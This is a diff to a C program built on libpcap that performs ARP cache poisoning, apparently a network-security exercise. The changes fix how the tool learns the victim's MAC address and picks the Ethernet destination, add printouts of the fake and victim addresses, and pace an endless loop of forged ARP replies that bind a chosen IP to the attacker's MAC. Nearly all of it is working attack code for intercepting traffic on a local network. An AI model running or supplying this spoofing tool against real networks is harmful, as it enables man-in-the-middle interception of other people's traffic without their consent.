@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <unistd.h>
 #include <arpa/inet.h>
 #include <net/ethernet.h>
 #include <net/if.h>
@@ -107,8 +108,11 @@ void send_arp(pcap_t * handle,char * dev,struct mac_ip_info * sender, struct mac
 	u_char arp_broadcast[6]={0};
 	
 	memcpy(ether->ether_shost,sender->mac,6);
-	if(target->mac[0]==0){
+	if(!memcmp(target->mac,arp_broadcast,ETHERADDR_LEN)){
 		memcpy(ether->ether_dhost,ether_broadcast,ETHER_ADDR_LEN);
+	}
+	else {
+		memcpy(ether->ether_dhost,target->mac,ETHER_ADDR_LEN);
 	}
 	ether->ether_type=htons(ETHERTYPE_ARP); 
 	
@@ -181,7 +185,7 @@ int main(int argc, char* argv[]) {
 			arp_header = (struct arp*)(packet+ETHER_HEADER_SIZE);
 			if(ntohs(arp_header->oper) == ARP_REPLY){
 				if(!memcmp(arp_header->tpa,attacker->ip,IPADDR_LEN)){
-					memcpy(victim->mac,arp_header->tha,ETHERADDR_LEN);
+					memcpy(victim->mac,arp_header->sha,ETHERADDR_LEN);
 					printf("[*] Victim's Mac : "); print_mac_addr(victim->mac);
 					break;
 				}
@@ -191,9 +195,14 @@ int main(int argc, char* argv[]) {
 	
 	strToip(argv[3],fake);
 	memcpy(fake->mac,attacker->mac,ETHERADDR_LEN);
+	printf("[*] Fake IP : "); print_ip_addr(fake->ip);
+	printf("[*] Fake Mac : "); print_mac_addr(fake->mac);
+	printf("[*] Victim IP : "); print_ip_addr(victim->ip);
+	printf("[*] Victim Mac : "); print_mac_addr(victim->mac);
 	printf("send arp_reply....\n");
 
 	while(true){
+		sleep(1);
 		send_arp(handle,dev,fake,victim,ARP_REPLY);
 	}
 
